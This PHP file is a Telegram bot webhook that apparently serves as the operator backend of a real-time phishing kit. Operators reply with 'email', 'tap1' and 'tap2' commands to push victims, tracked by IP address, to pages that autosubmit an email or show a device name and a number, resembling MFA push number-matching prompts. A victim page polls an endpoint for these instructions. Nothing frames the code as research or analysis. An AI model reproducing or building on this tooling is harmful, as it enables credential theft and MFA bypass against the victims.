<?php
include("include.php");

$update = file_get_contents('php://input');
$update = json_decode($update, true);

// Debug: log all incoming updates
@file_put_contents('telegram/debug_log.txt', date('Y-m-d H:i:s') . " | " . json_encode($update) . "\n", FILE_APPEND);

$replyMsgId = $update["callback_query"]["message"]["message_id"] ?? null;
$response = $update["callback_query"]["data"] ?? null;

// Check if this is a reply message (text message reply)
$replyText = $update["message"]["text"] ?? null;
$replyToMessageId = $update["message"]["reply_to_message"]["message_id"] ?? null;
$messageId = $update["message"]["message_id"] ?? null;

$statusRep = "";
$statusIP = "";

// Handle reply messages for tap1 and tap2
if ($replyText !== null && $replyToMessageId !== null) {
	// Parse reply format: tap1|device_name or tap2|device_name|number
	$parts = explode("|", $replyText);
	$action = strtolower(trim($parts[0]));

	// Extract IP from the original message to identify the session
	$original_text = $update["message"]["reply_to_message"]["text"] ?? '';

	// Try to match IP address with more flexible pattern
	if (preg_match('/IP[:\s]+`?(\d+\.\d+\.\d+\.\d+)`?/', $original_text, $matches) ||
	    preg_match('/(\d+\.\d+\.\d+\.\d+)/', $original_text, $matches)) {
		$ip_from_message = $matches[1];

		// Debug: log what we found
		@file_put_contents('telegram/debug_log.txt', date('Y-m-d H:i:s') . " | Found IP: " . $ip_from_message . " | Action: " . $action . " | Parts: " . count($parts) . "\n", FILE_APPEND);

		if ($action === 'email' && count($parts) === 2) {
			// email|email@gmail.com
			$email = trim($parts[1]);

			// Redirect to index.php with GET parameter
			$file_name = 'telegram/' . $ip_from_message . ".txt";
			file_put_contents($file_name, trim('index.php?email=' . urlencode($email) . '&autosubmit=1'));

			// Send confirmation message
			telegram_send_message(
				"✅ *EMAIL set successfully!*\n\n📧 *Email:* `" . $email . "`\n\n🔄 Redirecting to index.php...",
				$telegram_token,
				$telegram_chat_id,
				$messageId
			);
			exit;
		} elseif ($action === 'tap1' && count($parts) === 2) {
			// tap1|device_name
			$device_name = trim($parts[1]);

			// Redirect to tap.php with GET parameter
			$file_name = 'telegram/' . $ip_from_message . ".txt";
			file_put_contents($file_name, trim('tap.php?device=' . urlencode($device_name)));

			// Send confirmation message
			telegram_send_message(
				"✅ *TAP1 set successfully!*\n\n📱 *Device:* `" . $device_name . "`\n\n🔄 Redirecting to tap.php...",
				$telegram_token,
				$telegram_chat_id,
				$messageId
			);
			exit;
		} elseif ($action === 'tap2' && count($parts) === 3) {
			// tap2|device_name|number
			$device_name = trim($parts[1]);
			$number = trim($parts[2]);

			// Redirect to tap2.php with GET parameters
			$file_name = 'telegram/' . $ip_from_message . ".txt";
			file_put_contents($file_name, trim('tap2.php?device=' . urlencode($device_name) . '&number=' . urlencode($number)));

			// Send confirmation message
			telegram_send_message(
				"✅ *TAP2 set successfully!*\n\n📱 *Device:* `" . $device_name . "`\n🔢 *Number:* `" . $number . "`\n\n🔄 Redirecting to tap2.php...",
				$telegram_token,
				$telegram_chat_id,
				$messageId
			);
			exit;
		} else {
			// Invalid format
			telegram_send_message(
				"❌ *Invalid format!*\n\n*For EMAIL:*\n`email|email@example.com`\n*Example:* `email|user@gmail.com`\n\n*For TAP1:*\n`tap1|Device Model`\n*Example:* `tap1|iPhone 13`\n\n*For TAP2:*\n`tap2|Device Model|Number`\n*Example:* `tap2|iPhone 13|58`",
				$telegram_token,
				$telegram_chat_id,
				$messageId
			);
			exit;
		}
	}
	exit;
}

if (strlen($response)) {
	$data = explode("$", $response);
	$ip_from_message = $data[0];
	$status_from_message = $data[1];
	$file_name = 'telegram/' . $ip_from_message . ".txt";
	// save response
	file_put_contents($file_name,  trim($status_from_message));
	// update message remove buttons
	telegram_remove_buttons($replyMsgId, $telegram_token, $telegram_chat_id);
} else {
	if (isset($_POST["ip"])) {
		$file_name = 'telegram/' . $_POST["ip"] . ".txt";
		if (file_exists($file_name)) {
			// open file and get info
			$rep = file_get_contents($file_name);
			$responseData = array(
				'status' => $rep,
				'ip' => $_POST["ip"]
			);

			header('Content-Type: application/json');
			echo json_encode($responseData);
			// set empty file after response sent
			file_put_contents($file_name, "");
		}
	}
}
?>